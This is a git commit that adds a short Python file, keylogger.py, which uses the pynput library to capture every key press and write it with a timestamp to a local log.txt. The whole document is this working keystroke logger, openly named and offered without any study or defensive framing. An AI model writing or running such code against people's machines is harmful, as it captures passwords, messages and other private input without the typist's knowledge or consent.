740413b4e0884e6603e75fb546d1ce665ce4c42c
Javier Ferrándiz Fernández <96439507+MrJay16018@users.noreply.github.com>
2022-10-16 14:42:16 +0200

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,19 @@
+from time import asctime
+from pynput.keyboard \
+        import Listener
+import logging
+
+logging.basicConfig(
+filename=("log.txt"),
+level=logging.DEBUG,
+format=" %(asctime)s-%(message)s")
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) \
+        as listener:
+    listener.join()
+    
+
+
